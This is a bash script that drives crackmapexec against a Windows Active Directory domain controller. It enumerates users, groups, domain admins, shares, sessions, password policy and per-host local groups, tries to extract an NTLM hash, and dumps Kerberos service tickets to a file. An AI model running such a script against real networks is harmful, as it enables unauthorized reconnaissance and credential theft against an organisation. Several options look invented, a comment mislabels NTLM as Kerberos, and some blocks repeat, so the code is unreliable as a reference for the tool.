#!/bin/bash

usage() {
  echo "Usage: $0 [-h] [-d DOMAIN] [-dc DOMAIN_CONTROLLER] -u USER [-p PASSWORD] [-N]"
  echo
  echo "This script performs several enumeration actions against a Windows Active Directory domain for the SMB protocol using crackmapexec."
  echo
  echo "Options:"
  echo "  -h, --help                                    Show this help message and exit."
  echo "  -d, --domain DOMAIN                           The domain name to enumerate."
  echo "  -dc, --domain-controller DOMAIN_CONTROLLER    The hostname or IP address of a domain controller."
  echo "  -u, --user USER                               The username to use when authenticating to the domain (if not password is provided, user is '')."
  echo "  -p, --password PASSWORD                       The password to use when authenticating to the domain (if you want to use, if not, user and pass are '')."
  echo "  -N, --no-pass                                 Do not use a password when authenticating to the domain."
  exit 1
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        -d|--domain)
        DOMAIN="$2"
        shift # past argument
        shift # past value
        ;;
        -dc|--domain-controller)
        DC="$2"
        shift # past argument
        shift # past value
        ;;
        -u|--user)
        USER="$2"
        shift # past argument
        shift # past value
        ;;
        -p|--password)
        PASSWORD="$2"
        shift # past argument
        shift # past value
        ;;
        -N|--no-pass)
        NOPASS=true
        shift # past argument
        ;;
        *)    # unknown option
        echo "Unknown option: $1"
        usage
        exit 1
        ;;
    esac
done

# Set default values for optional parameters
if [ -z "$PASSWORD" ]; then
    USEROPT="-u ''"
    PASSOPT="-p ''"
else
    USEROPT="-u $USER"
    PASSOPT="-p $PASSWORD"
fi

# Set default values for required parameters
if [ -z "$DC" ]; then
    echo "Domain controller not specified"
    usage
    exit 1
fi

if [ -z "$USER" ]; then
    echo "Username not specified"
    usage
    exit 1
fi

if [ -z "$DOMAIN" ]; then
    echo "Domain not specified"
    usage
    exit 1
fi

# Get the user's Kerberos hash
if [ "$NOPASS" = true ]; then
    HASH=$(crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass | grep 'HASH.*NTLM' | awk '{print $3}')
else
    HASH=$(crackmapexec smb $DC $USEROPT $PASSOPT --local-auth | grep 'HASH.*NTLM' | awk '{print $3}')
fi

# Enumerate users
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass --users > users.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --users > users.txt
fi

# Enumerate groups
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass --groups > groups.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --groups > groups.txt
fi

# Enumerate domain admins
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass --groups | grep -i 'domain admins' | awk '{print $1}' > domain_admins.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --groups | grep -i 'domain admins' | awk '{print $1}' > domain_admins.txt
fi

# Enumerate computers
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass --no-bruteforce --no-registry --no-wmi --no-mssql --no-snmp --no-winrm -oG computers.gnmap
else
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-bruteforce --no-registry --no-wmi --no-mssql --no-snmp --no-winrm -oG computers.gnmap
fi

# Enumerate shares
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --no-pass --shares > shares.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --local-auth --shares > shares.txt
fi

# Enumerate domain users with password policy information
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --users --pass-pol > users_with_password_policy_info.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --users --pass-pol > users_with_password_policy_info.txt
fi

# Enumerate Kerberos tickets
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --kerberos > kerberos_tickets.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --kerberos > kerberos_tickets.txt
fi

# Dump Kerberos tickets
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --krb5tgs > tickets.kirbi
else
    crackmapexec smb $DC $USEROPT $PASSOPT --krb5tgs > tickets.kirbi
fi

# Enumerate computers
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --ping > computers.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --ping > computers.txt
fi

# Enumerate shares
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --shares > shares.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --shares > shares.txt
fi

# Enumerate open SMB sessions
if [ "$NOPASS" = true ]; then
    crackmapexec smb $DC $USEROPT $PASSOPT --no-pass --sessions > sessions.txt
else
    crackmapexec smb $DC $USEROPT $PASSOPT --sessions > sessions.txt
fi

# Enumerate local groups on each computer
if [ "$NOPASS" = true ]; then
    for computer in $(cat computers.txt); do
        crackmapexec smb $computer $USEROPT $PASSOPT --no-pass --local-groups > "local_groups_$computer.txt"
    done
else
    for computer in $(cat computers.txt); do
        crackmapexec smb $computer $USEROPT $PASSOPT --local-groups > "local_groups_$computer.txt"
    done
fi
